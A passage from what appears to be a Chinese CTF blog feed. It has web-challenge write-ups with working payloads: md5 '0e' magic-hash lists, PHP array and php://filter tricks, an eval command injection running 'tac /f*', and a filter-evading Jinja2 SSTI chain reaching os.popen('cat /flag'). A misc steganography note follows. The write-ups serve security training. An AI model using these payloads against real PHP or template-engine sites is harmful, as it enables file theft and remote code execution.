(==)"></a>1. 比较运算符 (<code>==</code>)</h5><p><code>==</code> 运算符会进行类型转换，具体规则如下：</p><ul><li>如果两个 operand 都是数字或字符串，执行标准比较。</li><li>如果一个 operand 是字符串，另一个是数字，将字符串转换为数字，然后比较。</li><li>如果其中一个 operand 是 <code>boolean</code>，将另一个 operand 转换为 <code>boolean</code>，然后比较。</li><li>如果两个 operand 都是 <code>null</code>，则认为它们相等。</li><li>如果其中一个 operand 是 <code>array</code>，另一个不是，则认为它们不相等。</li></ul><h5 id="2-严格比较运算符"><a href="#2-严格比较运算符" class="headerlink" title="2. 严格比较运算符 (===)"></a>2. 严格比较运算符 (<code>===</code>)</h5><p><code>===</code> 运算符不会进行类型转换，只有当两个 operand 的类型和值都相同时，才认为它们相等。</p><p><strong><em>例题：[SWPUCTF 2021 新生赛]easy_md5（NSSCTF）</em></strong></p><p><img src="https://pic1.imgdb.cn/item/67dd33d488c538a9b5c2e2af.png" alt=""></p><p>仔细阅读代码发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($name != $password &amp;&amp; md5($name) == md5($password))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>既要两变量个值不相同，又要两个变量md5值一样，<br> 可以发现此时判断md5值是否一样用的是<code>==</code>，这是php的弱类型比较，<br> <strong>方法一：</strong> 可以使用带0e开头的数字穿进行传递参数，因为php会将0e开头的数字转化为0，故此时md5值相等，而两个变量值不相等；<br> <strong>方法二：</strong> 可以传递数组，如name[]=123,password[]=456，md5不能加密数组，故两个md5返回的都是null</p><p>另：若遇到<code>===</code>这样的强类型比较，方法一就失效了，方法二仍然有效，或者还可以使用软件fastcoll进行md5碰撞，生成两个字符串使得他们的md5值相同</p><p>另：0e开头的数字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line"> 0e545993274517709034328855841020</span><br><span class="line"> s155964671a</span><br><span class="line"> 0e342768416822451524974117254469</span><br><span class="line"> s214587387a</span><br><span class="line"> 0e848240448830537924465865611904</span><br><span class="line"> s214587387a</span><br><span class="line"> 0e848240448830537924465865611904</span><br><span class="line"> s878926199a</span><br><span class="line"> 0e545993274517709034328855841020</span><br><span class="line"> s1091221200a</span><br><span class="line"> 0e940624217856561557816327384675</span><br><span class="line"> s1885207154a</span><br><span class="line"> 0e509367213418206700842008763514</span><br><span class="line"> s1502113478a</span><br><span class="line"> 0e861580163291561247404381396064</span><br><span class="line"> s1885207154a</span><br><span class="line"> 0e509367213418206700842008763514</span><br><span class="line"> s1836677006a</span><br><span class="line"> 0e481036490867661113260034900752</span><br><span class="line"> s155964671a</span><br><span class="line"> 0e342768416822451524974117254469</span><br><span class="line"> s1184209335a</span><br><span class="line"> 0e072485820392773389523109082030</span><br><span class="line"> s1665632922a</span><br><span class="line"> 0e731198061491163073197128363787</span><br><span class="line"> s1502113478a</span><br><span class="line"> 0e861580163291561247404381396064</span><br><span class="line"> s1836677006a</span><br><span class="line"> 0e481036490867661113260034900752</span><br><span class="line"> s1091221200a</span><br><span class="line"> 0e940624217856561557816327384675</span><br><span class="line"> s155964671a</span><br><span class="line"> 0e342768416822451524974117254469</span><br><span class="line"> s1502113478a</span><br><span class="line"> 0e861580163291561247404381396064</span><br><span class="line"> s155964671a</span><br><span class="line"> 0e342768416822451524974117254469</span><br><span class="line"> s1665632922a</span><br><span class="line"> 0e731198061491163073197128363787</span><br><span class="line"> s155964671a</span><br><span class="line"> 0e342768416822451524974117254469</span><br><span class="line"> s1091221200a</span><br><span class="line"> 0e940624217856561557816327384675</span><br><span class="line"> s1836677006a</span><br><span class="line"> 0e481036490867661113260034900752</span><br><span class="line"> s1885207154a</span><br><span class="line"> 0e509367213418206700842008763514</span><br><span class="line"> s532378020a</span><br><span class="line"> 0e220463095855511507588041205815</span><br><span class="line"> s878926199a</span><br><span class="line"> 0e545993274517709034328855841020</span><br><span class="line"> s1091221200a</span><br><span class="line"> 0e940624217856561557816327384675</span><br><span class="line"> s214587387a</span><br><span class="line"> 0e848240448830537924465865611904</span><br><span class="line"> s1502113478a</span><br><span class="line"> 0e861580163291561247404381396064</span><br><span class="line"> s1091221200a</span><br><span class="line"> 0e940624217856561557816327384675</span><br><span class="line"> s1665632922a</span><br><span class="line"> 0e731198061491163073197128363787</span><br><span class="line"> s1885207154a</span><br><span class="line"> 0e509367213418206700842008763514</span><br><span class="line"> s1836677006a</span><br><span class="line"> 0e481036490867661113260034900752</span><br><span class="line"> s1665632922a</span><br><span class="line"> 0e731198061491163073197128363787</span><br><span class="line"> s878926199a</span><br><span class="line"> 0e545993274517709034328855841020</span><br><span class="line"> 240610708</span><br><span class="line"> 0e462097431906509019562988736854</span><br><span class="line"> 314282422</span><br></pre></td></tr></table></figure><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><h4 id="1-file"><a href="#1-file" class="headerlink" title="1. file://"></a>1. <code>file://</code></h4><ul><li><strong>用途</strong>：访问本地文件系统。</li><li><strong>示例</strong>：<code>file:///path/to/file.txt</code>。</li></ul><h4 id="2-http-和-https"><a href="#2-http-和-https" class="headerlink" title="2. http:// 和 https://"></a>2. <code>http://</code> 和 <code>https://</code></h4><ul><li><strong>用途</strong>：访问 HTTP(S) 网址。</li><li><strong>示例</strong>：<code>http://example.com</code>。</li></ul><h4 id="3-ftp-和-ftps"><a href="#3-ftp-和-ftps" class="headerlink" title="3. ftp:// 和 ftps://"></a>3. <code>ftp://</code> 和 <code>ftps://</code></h4><ul><li><strong>用途</strong>：访问 FTP(S) URLs。</li><li><strong>示例</strong>：<code>ftp://example.com/file.txt</code>。</li></ul><h4 id="4-php"><a href="#4-php" class="headerlink" title="4. php://"></a>4. <code>php://</code></h4><ul><li><strong>用途</strong>：访问各个输入/输出流（I/O streams）。</li><li><strong>子协议</strong>：<ul><li><code>php://stdin</code>、<code>php://stdout</code>、<code>php://stderr</code>：分别代表标准输入、输出和错误输出流。</li><li><code>php://input</code>：允许访问原始的POST数据。</li><li><code>php://memory</code> 和 <code>php://temp</code>：用于访问内存或临时文件系统，适用于处理临时数据。</li></ul></li></ul><h4 id="5-php-filter"><a href="#5-php-filter" class="headerlink" title="5. php://filter"></a>5. <code>php://filter</code></h4><ul><li><strong>用途</strong>：在数据流打开时应用过滤器，常用于读取文件源码。</li><li><strong>示例</strong>：<code>php://filter/read=convert.base64-encode/resource=example.txt</code>。</li></ul><h4 id="6-data"><a href="#6-data" class="headerlink" title="6. data://"></a>6. <code>data://</code></h4><ul><li><strong>用途</strong>：内联数据流（RFC 2397），允许将字符串作为文件内容来访问。</li><li><strong>示例</strong>：<code>data://text/plain;base64,SGVsbG8sIFdvcmxkIQ==</code>。</li></ul><h4 id="7-zip"><a href="#7-zip" class="headerlink" title="7. zip://"></a>7. <code>zip://</code></h4><ul><li><strong>用途</strong>：访问 ZIP 压缩文件中的具体文件，无需解压整个压缩包。</li><li><strong>示例</strong>：<code>zip://path/to/archive.zip/file.txt</code>。</li></ul><h4 id="8-glob"><a href="#8-glob" class="headerlink" title="8. glob://"></a>8. <code>glob://</code></h4><ul><li><strong>用途</strong>：查找匹配的文件路径模式。</li><li><strong>示例</strong>：<code>glob://*.txt</code>。</li></ul><h4 id="9-phar"><a href="#9-phar" class="headerlink" title="9. phar://"></a>9. <code>phar://</code></h4><ul><li><strong>用途</strong>：访问 PHP 归档文件（PHAR）。</li><li><strong>示例</strong>：<code>phar://path/to/archive.phar/file.php</code>。</li></ul><h4 id="10-ssh2"><a href="#10-ssh2" class="headerlink" title="10. ssh2://"></a>10. <code>ssh2://</code></h4><ul><li><strong>用途</strong>：通过 SSH2 协议访问资源。</li><li><strong>示例</strong>：<code>ssh2.sftp://user:pass@example.com/path/to/file</code>。</li></ul><h4 id="11-rar"><a href="#11-rar" class="headerlink" title="11. rar://"></a>11. <code>rar://</code></h4><ul><li><strong>用途</strong>：访问 RAR 压缩包。</li><li><strong>示例</strong>：<code>rar://path/to/archive.rar/file.txt</code>。</li></ul><h4 id="12-ogg"><a href="#12-ogg" class="headerlink" title="12. ogg://"></a>12. <code>ogg://</code></h4><ul><li><strong>用途</strong>：访问 OGG 音频流。</li><li><strong>示例</strong>：<code>ogg://path/to/file.ogg</code>。</li></ul><h4 id="13-expect"><a href="#13-expect" class="headerlink" title="13. expect://"></a>13. <code>expect://</code></h4><ul><li><strong>用途</strong>：处理交互式流。</li><li><strong>示例</strong>：<code>expect://command</code>。</li></ul><p><strong><em>例题：[SWPUCTF 2021 新生赛]include（NSSCTF）</em></strong></p><p>首先看到题目提示传个file，遂/?file=…一个随意参数，而后得到源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_include&quot;</span>,<span class="string">&quot;on&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag 在flag.php中&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;传入一个file试试&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span> flag 在flag.php中</span><br></pre></td></tr></table></figure><p>发现有include_once函数；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include_once()：在脚本执行期间包含并运行指定文件。该函数和include 函数类似，两者唯一的区别是 使用该函数的时候，php会加检查指定文件是否已经被包含过，如果是，则不会再被包含。</span><br></pre></td></tr></table></figure><p>于是利用伪协议构造，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>​    得到经过Base64加密的flag，解密即可。</p><h2 id="做题记录（newstar2024）"><a href="#做题记录（newstar2024）" class="headerlink" title="做题记录（newstar2024）"></a>做题记录（newstar2024）</h2><h3 id="题目：遗失的拉链"><a href="#题目：遗失的拉链" class="headerlink" title="题目：遗失的拉链"></a>题目：遗失的拉链</h3><p>拉链的英文是 zip，这里是网站备份文件的泄露</p><p>可以用dirsearch扫描出存在www.zip:</p><p>我们直接下载：</p><p><img src="https://pic1.imgdb.cn/item/67dbe22088c538a9b5c1f5dd.png" alt=""></p><p>pizwww.php的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// for fun</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;star&#x27;</span>])&amp;&amp;<span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;star&#x27;</span>])&#123;</span><br><span class="line">        <span class="comment">// 欸 为啥 sha1 和 md5 相等呢</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|flag/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;u can not do this &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Wrong&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get 传入 new，post 传入 star，要求二者不相等并且 new 经过 sha1 加密要等于 star 经过 md5 加密，则可以 post 传入 cmd 命令进行调用，有一点正则的过滤，之后输出返回结果。</p><p>采用数组绕过，payload：</p><pre><code>pizwww.php?new[]=1post：star[]=2&amp;cmd=system(&quot;ls&quot;);</code></pre><p><img src="https://pic1.imgdb.cn/item/67dd3b6188c538a9b5c2e4c5.png" alt=""></p><p>读取根目录下的 flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pizwww.php?new[]=<span class="number">1</span></span><br><span class="line">post：star[]=<span class="number">2</span>&amp;cmd=system(<span class="string">&quot;tac /f*&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67dd3b9188c538a9b5c2e4d0.png" alt=""></p><p><strong>flag{2aecd643-6c65-de9c-0edd-4e0de6525be8}</strong></p><h3 id="题目：你能在一秒内打出八句英文吗"><a href="#题目：你能在一秒内打出八句英文吗" class="headerlink" title="题目：你能在一秒内打出八句英文吗"></a>题目：你能在一秒内打出八句英文吗</h3><p>使用脚本，获取页面内容并提交：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"> </span><br><span class="line">session = requests.Session()</span><br><span class="line">response = session.get(<span class="string">&#x27;......&#x27;</span>)</span><br><span class="line">welcome_title = BeautifulSoup(response.content, <span class="string">&#x27;html.parser&#x27;</span>).find(<span class="string">&#x27;h1&#x27;</span>).text</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;欢迎信息: <span class="subst">&#123;welcome_title&#125;</span>&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">text = BeautifulSoup(session.get(<span class="string">&#x27;....../start&#x27;</span>).content, <span class="string">&#x27;html.parser&#x27;</span>).find(<span class="string">&#x27;p&#x27;</span>, <span class="built_in">id</span>=<span class="string">&#x27;text&#x27;</span>).text</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;需要打字的文本: <span class="subst">&#123;text&#125;</span>&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">submit_response = session.post(<span class="string">&#x27;....../submit&#x27;</span>, data=&#123;<span class="string">&#x27;user_input&#x27;</span>: text&#125;)</span><br><span class="line">submit_soup = BeautifulSoup(submit_response.content, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;提交结果: <span class="subst">&#123;submit_soup.find(<span class="string">&quot;p&quot;</span>).text&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> idx, info <span class="keyword">in</span> <span class="built_in">enumerate</span>(submit_soup.find_all(<span class="string">&#x27;p&#x27;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;额外信息 <span class="subst">&#123;idx + <span class="number">1</span>&#125;</span>: <span class="subst">&#123;info.text&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67dd41bc88c538a9b5c2e655.png" alt=""></p><p><strong>flag{7f335c0e-3104-1691-9600-d94014080de0}</strong></p><h3 id="题目：复读机"><a href="#题目：复读机" class="headerlink" title="题目：复读机"></a>题目：复读机</h3><p>解法1</p><p>输入 <code>&#123;&#123; 7*7 &#125;&#125;</code> 的时候，输出的结果是 49，说明存在 SSTI 注入</p><p>输入 <code>&#123;&#123; [].__class__ &#125;&#125;</code>，发现 bot 显示不喜欢上课,说明 <code>class</code> 被过滤了，可以使用简单的拼接绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[][&#x27;__cl&#x27;+&#x27;ass__&#x27;]&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到 <code>list</code> 类</p><p><img src="https://ctf.xidian.edu.cn/api/media?hash=64c5608719e4e18ce74037769a1db69deeb043dbaed9bb8f829a12e58f32350a" alt="简单的 SSTI"></p><p>后面就是基本的注入方法了</p><p>获取 <code>object</code> 类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&#x27;__cl&#x27;+&#x27;ass__&#x27;][&#x27;__base__&#x27;]&#125;&#125;</span><br><span class="line">&#123;&#123;()[&#x27;__cl&#x27;+&#x27;ass__&#x27;][&#x27;__base__&#x27;][&#x27;__subcl&#x27;+&#x27;asses__&#x27;]()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://ctf.xidian.edu.cn/api/media?hash=d55ffa6762a9904e92a55d3da452bb8a2c0c4ff7f36e30230616df8131207d02" alt="获取 object 类"></p><p>找一个可以利用的类，这里选用 <code>os._wrap_close</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&#x27;__cl&#x27;+&#x27;ass__&#x27;][&#x27;__base__&#x27;][&#x27;__subcl&#x27;+&#x27;asses__&#x27;]()[132]&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://ctf.xidian.edu.cn/api/media?hash=c1d29c5bc1de84b003be481a9d3c559e6a58e0e5a48b1a1e96525f0727fe1ca7" alt="获取 os._wrap_close"></p><p>然后就是拿到 <code>eval</code> 方法，命令执行就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&#x27;__cl&#x27;+&#x27;ass__&#x27;][&#x27;__base__&#x27;][&#x27;__subcl&#x27;+&#x27;asses__&#x27;]()[132][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>解2：</p><p><img src="https://pic1.imgdb.cn/item/67dd448788c538a9b5c2e6d9.png" alt=""></p><p>这题考察的是SSTI 注入，不太熟悉，相关的题比较少。现在只是简单了解了一下。</p><h2 id="题目总结学习"><a href="#题目总结学习" class="headerlink" title="题目总结学习"></a>题目总结学习</h2><h3 id="www-zip泄露"><a href="#www-zip泄露" class="headerlink" title="www.zip泄露"></a>www.zip泄露</h3><p>网站备份压缩文件泄露是一种常见的安全问题，通常发生在网站升级或维护过程中。当网站管理员对网站文件进行修改时，可能会对整站或部分页面进行备份，并将备份文件保存为zip、rar、tar.gz等格式。如果这些备份文件被放置在web服务器可以访问的目录下，而没有设置适当的访问权限，就可能导致敏感信息泄露</p><p>常见的备份文件名包括<code>www.zip</code>、<code>web.zip</code>、<code>data.zip</code>、<code>backup.zip</code>等</p><p>攻击者可以通过扫描工具如dirsearch等，尝试访问这些常见的备份文件路径，一旦发现可访问的压缩文件，就可以下载并解压，获取其中的敏感信息，如服务器配置文件、数据库连接信息等</p><p>为了防范此类泄露，网站管理员应避免将备份文件存放在可公开访问的目录下，或者对备份文件设置严格的访问控制，如使用强密码保护、限制IP访问等</p><p>例如，某网站在升级过程中，将网站源码备份为<code>www.zip</code>并存放在网站根目录下，且没有设置访问权限。攻击者通过扫描工具发现了这个压缩文件，下载后解压获取了网站的源代码，其中包含了数据库连接字符串等敏感信息，从而进一步入侵了该网站的数据库</p><p>SSTI（Server-Side Template Injection）漏洞是一种针对服务器端模板引擎的安全漏洞，允许攻击者通过注入恶意代码来控制模板渲染过程，从而获取敏感信息或执行任意代码等操作</p><h3 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h3><p>SSTI漏洞产生的主要原因是服务端在接收用户输入后，未对其进行有效的验证和过滤，就直接将其作为Web应用模板内容的一部分。当模板引擎在进行目标编译渲染时，攻击者注入的恶意代码会被当作合法的模板片段来处理，从而导致漏洞的利用。</p><p><strong>原理</strong></p><p>当攻击者能够控制要呈现的模板时，服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，就可能导致上下文数据的暴露，甚至在服务器上运行任意命令的表达式</p><p><strong>利用方式</strong></p><ol><li><strong>关键字绕过</strong>：使用切片将逆置的关键字顺序输出，或者利用字符串拼接、join拼接、引号绕过、str原生函数replace替换、ascii转换、16进制编码绕过、base64编码绕过、unicode编码绕过等方法来绕过关键字过滤。</li><li><strong>利用过滤器</strong>：在 JinJa2 等模板引擎中，利用内置的过滤器来逐步拼接出需要的字符、数字或字符串，从而构造出恶意代码。</li><li><strong>绕过init</strong>：可以用 <code>__enter__</code> 或 <code>__exit__</code> 替代 <code>__init__</code>，以绕过对 <code>__init__</code> 的过滤。</li></ol><h3 id="SSTI注入的利用方式"><a href="#SSTI注入的利用方式" class="headerlink" title="SSTI注入的利用方式"></a>SSTI注入的利用方式</h3><h4 id="1-探测SSTI漏洞"><a href="#1-探测SSTI漏洞" class="headerlink" title="1. 探测SSTI漏洞"></a>1. 探测SSTI漏洞</h4><p>攻击者通常会先探测是否存在SSTI漏洞。常见的探测方法包括：</p><ul><li>发送特殊字符，观察服务器的响应。</li><li>使用简单的模板语法，如 <code>&#123;&#123; 7*7 &#125;&#125;</code>，如果服务器返回 <code>49</code>，则可能存在SSTI漏洞。</li></ul><h4 id="2-利用SSTI漏洞"><a href="#2-利用SSTI漏洞" class="headerlink" title="2. 利用SSTI漏洞"></a>2. 利用SSTI漏洞</h4><p>一旦确认存在SSTI漏洞，攻击者可以尝试以下操作：</p><ul><li><strong>读取敏感文件</strong>：通过模板引擎的文件读取功能，获取服务器上的敏感文件。</li><li><strong>执行任意代码</strong>：利用模板引擎的代码执行功能，运行恶意代码。</li><li><strong>获取服务器信息</strong>：通过模板引擎的内置函数，获取服务器的相关信息。</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc周报04</title>
      <link href="/2025/03/15/misc%E5%91%A8%E6%8A%A504/"/>
      <url>/2025/03/15/misc%E5%91%A8%E6%8A%A504/</url>
      
        <content type="html"><![CDATA[<h2 id="周报03"><a href="#周报03" class="headerlink" title="周报03"></a>周报03</h2><p><strong><em>【我的生命，因战斗而无限绚烂，因你们而无限光明！        ——《吞噬星空》】</em></strong></p><p>本周主要对月赛的复现。。。</p><h2 id="题目：少女的签到"><a href="#题目：少女的签到" class="headerlink" title="题目：少女的签到"></a>题目：少女的签到</h2><p>题目打开，有29张图片：</p><p><img src="https://pic1.imgdb.cn/item/67db7ab188c538a9b5c160a7.png" alt=""></p><p><img src="C:\Users\31715\AppData\Roaming\Typora\typora-user-images\image-20250320102205542.png" alt="image-20250320102205542"></p><p>分析图片属性，发现创建时间很久。</p><p>转换成时间戳，发现114514</p><p><img src="https://pic1.imgdb.cn/item/67db7c9788c538a9b5c16524.png" alt=""></p><p>因此这是通过每个图片的时间戳进行隐写的。</p><p>通过观察，创建时间的格式统⼀为1145140XXX</p><p>后三位可能是代表字符的⼗进制，写脚本提取：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path = <span class="string">&#x27;./result/&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">filename = path + <span class="built_in">str</span>(i) + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">file_attr = os.stat(filename)</span><br><span class="line">create_time = <span class="built_in">int</span>(file_attr.st_ctime)</span><br><span class="line">hide_char = <span class="built_in">chr</span>(create_time - <span class="number">1145140000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;file time: &#x27;</span> + <span class="built_in">str</span>(create_time) + <span class="string">&#x27; hide char: &#x27;</span> + (hide_char))</span><br><span class="line">flag += hide_char</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="题目：少女的请求"><a href="#题目：少女的请求" class="headerlink" title="题目：少女的请求"></a>题目：少女的请求</h2><p>附件看起来是个docx文档，但一般这样的文件类型都不一致：</p><p>随波逐流发现，这是一个zip文件：</p><p><img src="https://pic1.imgdb.cn/item/67db7df288c538a9b5c16590.png" alt=""></p><p>里面还有一个docx，显然也是zip:</p><p><img src="https://pic1.imgdb.cn/item/67db7e6688c538a9b5c165aa.png" alt=""></p><p>不过数量似乎有点多了？</p><p><img src="https://pic1.imgdb.cn/item/67db7ed988c538a9b5c165c4.png" alt=""></p><p>幸好不是超多的压缩包嵌套，需要脚本处理。</p><p>解压到四个的时候已经没有了</p><p><img 